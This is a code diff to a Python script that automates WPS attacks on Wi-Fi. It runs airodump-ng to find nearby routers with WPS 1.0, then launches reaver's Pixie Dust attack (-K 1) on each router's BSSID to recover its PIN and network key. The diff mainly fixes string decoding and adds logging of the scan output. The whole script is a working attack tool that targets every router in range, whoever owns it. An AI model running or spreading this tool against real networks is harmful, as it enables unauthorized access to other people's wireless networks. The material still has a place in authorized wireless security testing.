@@ -50,32 +50,34 @@ def main():
     dumps_list = []
     INTERFACE = sys.argv[1]
     SESSION_NAME = sys.argv[2]
-    print("\n[OUT]************ running AIRIDUMP-NG using ", INTERFACE, "  ************ \n")
+    print("\n************ running AIRODUMP-NG using ", INTERFACE, "  ************ \nPRESS CRTL-C to stop airodump-ng and continue\n")
     global AIRODUMP_ON
     AIRODUMP_ON = 1
+    dump = open('dumps', 'w+')
     process = subprocess.Popen(["airodump-ng", INTERFACE, "--wps"], stderr=subprocess.STDOUT, stdout=subprocess.PIPE, bufsize=1)
     while AIRODUMP_ON:
         out = process.stdout.read(1)
+        dump.write(out.decode('utf-8'))
         if out == '' and process.poll() != None:
     	    break
         if out != '':
     	    sys.stdout.write(out.decode('utf-8'))
     	    sys.stdout.flush()
-    AIRODUMP_ON = 0
-    print(out.decode('utf-8'))
+    dump.close()
+    dump = open('dumps', 'r')
+    dumps_list = dump.read().splitlines()
     print("\n[OUT]************ AIRODUMP-NG done.  WPS routers available: ************ \n")
     print(        'BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH WPS                    ESSID\n')
     output_file = open(SESSION_NAME + '_full.txt', 'w+')
-    output_file.write("[OUT]************ AIRODUMP-NG done.  WPS routers available: ************ \n")
     output_file.write(            'BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH WPS                    ESSID\n')
     wps_dumps = []
     essids = []
     for i in dumps_list:
         line = i.split()
         if len(line) >= 10:
-            if line[0] not in essids:
-                output_file.write(i.decode(encoding='UTF-8') + "\n")
-                print(i.decode(encoding='UTF-8') + "\n")
+            if line[0] not in essids and '1.0' in line:
+                output_file.write(i + "\n")
+                print(i + "\n")
                 wps_dumps.append(i)
                 essids.append(line[0])
     if len(wps_dumps) <= 0:
@@ -85,12 +87,10 @@ def main():
         sys.exit()
     for wps in wps_dumps:
         temp = wps.split()
-        output_file.write("\n[OUT]********************* PIXIE-DUST on " + temp[0].decode(
-            encoding='UTF-8') + "  *********************\n")
-        print("\n[OUT]********************* PIXIE-DUST on " + temp[0].decode(
-            encoding='UTF-8') + "  *********************\n")
-        reaver_p = subprocess.Popen(["reaver", "-i", INTERFACE, "-b", temp[0].decode(encoding='UTF-8'), "-v", "-c",
-                                     temp[5].decode(encoding='UTF-8'), "-d", "12", "-N", "-K", "1", "-Z"], stdout=PIPE)
+        output_file.write("\n[OUT]********************* PIXIE-DUST on " + temp[0] + "  *********************\n")
+        print("\n[OUT]********************* PIXIE-DUST on " + temp[0] + "  *********************\n")
+        reaver_p = subprocess.Popen(["reaver", "-i", INTERFACE, "-b", temp[0], "-v", "-c",
+                                     temp[5], "-d", "12", "-N", "-K", "1", "-Z"], stdout=PIPE)
         try:
             reaver_o, unused_reaver = reaver_p.communicate(timeout=400)
             print("\n[OUT]************ SESSION SUCCESFUL. Output:*********************\n")
